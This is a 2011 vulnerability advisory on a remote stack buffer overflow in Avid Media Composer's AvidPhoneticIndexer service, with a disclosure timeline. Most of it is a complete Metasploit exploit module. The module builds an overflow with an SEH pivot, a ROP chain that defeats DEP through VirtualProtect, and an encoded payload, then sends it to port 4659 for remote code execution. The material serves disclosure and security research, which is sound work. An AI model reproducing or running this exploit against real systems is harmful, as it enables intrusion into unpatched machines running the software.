#Name :AVID Media Composer Phonetic Indexer Remote Stack Buffer Overflow
#Vendor Website : http://www.avid.com
#Date Released : November 29, 2011
#Affected Software : AVID Media Composer <= 5.5.3 Researcher
#Researcher : Nick Freeman (nick.freeman@security-assessment.com)

#Description
#Security-Assessment.com discovered a remote stack buffer overflow vulnerability in a network daemon that #ships with Avid Media Composer 5.5, named AvidPhoneticIndexer.exe. By sending a large request to the #listening network service, it is possible to overwrite the stack of the process and gain arbitrary code #execution.

#Solution
#No patch is available for this vulnerability at this time. Host and network based firewalling are #recommended as workarounds to limit the exposure of the vulnerable service.

#Disclosure timeline
#Security-Assessment.com practices responsible disclosure and made significant effort to report this #vulnerability to AVID.
#14/05/11: Vulnerability identified.
#17/05/11: Avid Media Composer 5.5.2 released.
#26/05/11: Attempted calling, left voicemail and emailed the AVID Application Security Management team.
#Early June 2011: Called members of the AVID Media Composer Development team.
#Early-Mid June 2011: Emailed AVID Media Composer Product Management team, who indicated that they were aware #of the vulnerabilities before I had explained the nature of the issues. AVID explained that all #vulnerabilities were in the process of being resolved. Security-Assessment.com suggested collaboration to #ensure all issues were being identified, but AVID was not interested in pursuing this.
#17/08/11: Avid Media Composer 5.5.3 released. Vulnerability still present.
#05/11/11: Vulnerability released at Kiwicon V in Wellington, New Zealand.
#19/11/11: Vulnerability released at Ruxcon 2011 in Melbourne, Australia.
#29/11/11: Vulnerability advisory and exploit code published.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Avid Media Composer 5.5 - Avid Phonetic Indexer Stack Overflow",
			'Description'    => %q{
					This module exploits a stack buffer overflow in process AvidPhoneticIndexer.exe (port 4659),
				which comes as part of the Avid Media Composer 5.5 Editing Suite. This daemon sometimes starts on a
				different port; if you start it standalone it will run on port 4660.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 13137 $",
			'Author'         =>
				[
					'vt [nick.freeman@security-assessment.com]',
				],
			'References'     =>
				[
					[ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Avid_Media_Composer-Remote_Stack_Buffer_Overflow.pdf' ],
				],
			'Payload'        =>
				{
					'Space'    => 1012,
					'BadChars' => "\x00\x09\x0a\x0d\x20",
					'DisableNops' => true,
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EAX',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Professional SP3', {} ],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 29 2011",
			'DefaultTarget'  => 0))

			register_options(
				[
					Opt::RPORT(4659),
				], self.class)
	end

	def exploit

		junk = 'A' * 216
		sehpivot = "\xeb\x35\x8b\x02" #0x028B35EB :  # ADD ESP,1800 # RETN
		junk2 = 'A' * 732

		rop_gadgets = [

				# ROP chain (sayonara) courtesy of WhitePhosphorus (thanks guys!) - a non-sayonara ROP would be super easy too, I'm just lazy :)
				0x7C344CC1,  # pop eax;ret;
				0x7C3410C2, # pop ecx;pop ecx;ret;
				0x7C342462, # xor chain; call eax {0x7C3410C2}
				0x7C38C510, # writeable location for lpflOldProtect
				0x7C365645, # pop esi;ret;
				0x7C345243, # ret;
				0x7C348F46, # pop ebp;ret;
				0x7C3487EC, # call eax
				0x7C344CC1, # pop eax;ret;
				0xfffffbfc, # {size}
				0x7C34D749, # neg eax;ret; {adjust size}
				0x7C3458AA, # add ebx, eax;ret; {size into ebx}
				0x7C3439FA, # pop edx;ret;
				0xFFFFFFC0, # {flag}
				0x7C351EB1, # neg edx;ret; {adjust flag}
				0x7C354648, # pop edi;ret;
				0x7C3530EA, # mov eax,[eax];ret;
				0x7C344CC1, # pop eax;ret;
				0x7C37A181, # (VP RVA + 30) - {0xEF adjustment}
				0x7C355AEB, # sub eax,30;ret;
				0x7C378C81, # pushad; add al,0xef; ret;
				0x7C36683F, # push esp;ret;
		].pack("V*")

		# need to control a buffer reg for the msf gen'd payload to fly. in this case:
		bufregfix = "\x8b\xc4" 		# MOV EAX,ESP
		bufregfix += "\x83\xc0\x10" 	# ADD EAX,10

		connect
		sploit = junk + sehpivot + junk2 + rop_gadgets + bufregfix + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + payload.encoded
		sock.put(sploit)
		handler
		disconnect
	end
end